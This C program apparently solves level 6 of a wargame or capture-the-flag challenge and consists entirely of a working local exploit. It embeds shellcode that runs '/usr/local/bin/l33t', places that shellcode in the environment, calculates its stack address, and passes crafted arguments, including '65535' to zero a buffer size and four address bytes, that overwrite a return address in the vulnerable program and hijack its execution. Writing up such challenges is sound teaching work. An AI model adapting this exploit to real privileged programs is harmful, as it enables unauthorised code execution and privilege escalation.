#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define VULN "../../var/challenge/level6/6"

/* The shellcode for executing the '/usr/local/bin/l33t' command */
char shellcode[] = "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t";

int main() {
    /* Obtain the address of the shellcode */
	unsigned int addr = 0xc0000000 - 8 - strlen(VULN) - 1 - strlen(shellcode) - 1;	

	/* Define the comandline parameters that VULN expects */
    /* Set cmdParam1 to "65535" to configure the buffer size to zero */
	char cmdParam1[] = "65535";
	char cmdParam2[8], cmdParam3[8], cmdParam4[8], cmdParam5[8];
	
	/* Shellcode address in reverse order (little endian order) */
    /* Place each shellcode byte next to the corresponding offset, adjusting for the command-line input format of 6.c */
    /* This ensures proper alignment and execution in accordance with the expected memory layout */
	sprintf(cmdParam2, "%c28", addr);
	sprintf(cmdParam3, "%c29", addr >> 8);
	sprintf(cmdParam4, "%c30", addr >> 16);
	sprintf(cmdParam5, "%c31", addr >> 24);

	// Define a null-terminated ARGV array for execve()
	char *progWithParameters[] = {VULN, cmdParam1, cmdParam2, cmdParam3, cmdParam4, cmdParam5, NULL};
	
	//Define a null-terminated ENVP (environment) array for execve()
	// This is where the shellcode is placed on the environment
	char *envp[] = {shellcode, NULL};
	
	// Invoke execve(prog, progWithParameters, envp)
	if (execve(progWithParameters[0], progWithParameters, envp) == -1) {
		perror("execve");
        	exit(EXIT_FAILURE);
	}

	// The code after execve will not be reached if execve is successful
	return 0;
}